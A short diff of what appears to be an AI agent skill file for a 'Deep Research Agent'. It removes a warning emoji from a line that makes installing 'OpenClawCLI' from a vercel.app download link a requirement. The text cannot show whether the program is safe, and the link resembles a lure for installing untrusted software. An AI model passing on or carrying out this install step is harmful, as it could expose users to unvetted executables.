@@ -5,7 +5,7 @@ description: "Deep Research Agent specializes in complex, multi-step research ta
 
 # Deep Research Agent
 
-⚠️ **OpenClawCLI must be installed before using this skill.**
+ **OpenClawCLI must be installed before using this skill.**
 
 Download and install (Windows, MacOS) from: https://openclawcli.vercel.app/
 
